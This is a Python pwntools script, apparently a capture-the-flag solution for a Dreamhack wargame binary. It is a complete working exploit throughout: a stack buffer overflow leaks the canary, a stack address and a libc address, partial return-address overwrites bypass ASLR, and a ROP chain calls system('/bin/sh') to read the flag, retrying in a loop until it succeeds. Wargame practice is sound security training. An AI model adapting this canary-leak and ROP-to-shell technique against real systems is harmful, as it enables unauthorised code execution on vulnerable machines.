#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe

def main():
    while True:
        p = remote("host3.dreamhack.games",22210)
        try:
            p.sendlineafter(b'OMG BOF\n', b'a'*0xa8)
            p.recvuntil(b'a\n')
            canary = u64(b'\x00' + p.recvn(7))
            stack_leak = u64(p.recvn(6) + b'\x00'*2)
            print(f"canary_leak = {hex(canary)}, stack_leak = {hex(stack_leak)}")
            payload = b'a'*0xa8 + p64(canary) + p64(stack_leak + 0x60) + b'\x8b\xa2'
            p.sendafter(b'OMG BOF\n', payload)
            p.sendafter(b'OMG BOF\n', b'a'*0xb8)
            p.recvuntil(b'a'*0xb8)
            leak_libc = u64(p.recvn(6) + b'\x00'*2)
            print(f"leak_libc = {hex(leak_libc)}")
            libc.address = leak_libc - 0x2a1ca
            stack_src = stack_leak - 0x140 - 0xb0
            rop = ROP(libc)
            shell = (
                b'a'*8
                + p64(rop.rdi.address)
                + p64(next(libc.search(b'/bin/sh\x00')))
                + p64(rop.find_gadget(["ret"]).address)
                + p64(libc.sym['system'])
                + b'a'*(0xa8 - 40)
                + p64(canary)
                + p64(stack_src)
                + b'\xd2\x99'
            )
            p.sendafter(b'OMG BOF\n', shell)
            p.recvrepeat(1)
            p.sendline(b'cat flag')
            leak = p.recvrepeat(1)

            if b'DH' in leak:
                print("[+] Found flag!")
                print(leak.decode())
                break
        except EOFError:
            print("no flag")

        p.close()


if __name__ == "__main__":
    main()